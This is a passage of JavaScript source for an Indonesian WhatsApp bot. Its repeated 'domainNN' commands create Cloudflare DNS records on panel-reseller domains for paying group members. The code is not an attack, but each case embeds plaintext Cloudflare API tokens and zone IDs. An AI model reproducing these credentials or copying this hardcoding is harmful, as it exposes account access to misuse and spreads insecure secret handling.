if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "06a3fe4e7eec313be8ef30b744fcfeb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain18': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "04f62c54a011fe7929342bde68c6deb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "storepannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain19': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cc152c1a6c73b934af4e3c71d47f15db";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokopannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain20': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5efd37e4f4f1186ca6a92d6366b8d485";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain21': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b103a544abad82f68f03395cf8effda";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "adminpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain22': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "10bf5f40f9e6fe74fe5647c2b143de3a";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain23': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5c38f987cf217bfe2bf682d5bb310fe8";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokocpannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain24': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "736705fd97bebdf03ca4a007c2ca4a8f";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "websitepannelmurah.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 

case 'domain25': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a6c9cf9cd38077e52db6874200c5c0c4";
               let apitoken = "DyQW84WhtZwTfWZCanO-MQNd6gglRwDHOmK8KRF2";
               let tld = "panellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
   case 'domain26': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "512f917ecb9e0d4eb0085458fdcc95ee";
               let apitoken = "a4hizwK6UjIi8MBEscAOVNG-njTDfJejAhOJlOFh";
               let tld = "panellku.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
    case 'domain27': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b268933cdea4ffd662bc56dd84e46e21";
               let apitoken = "v80Y6QMWDamHAg-u18z8IEMBp1kpodn_lZkyduJ8";
               let tld = "panellku.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain28': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4e1c19a2687fe1a2505fecaf3de3e7ff";
               let apitoken = "p4oS8J-Tc0Rt9z4tgS3gdzbaG-aL0FQ0Ro1mpl-Q";
               let tld = "panellku.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break        
         case 'domain29': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "72fc614619292a5d6c86d3e736b14062";
               let apitoken = "MF2cgyOmXeFdrwpcTS4XRbYbDL9zsmF6XY6TIFlv";
               let tld = "panelkuu.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain30': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c8a876bc10af3ce5ab11f2209121cf63";
               let apitoken = "O8uR00EP6u4Rp9TtmwCSASwfkEHAIaNw2DVmIgAD";
               let tld = "panellku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
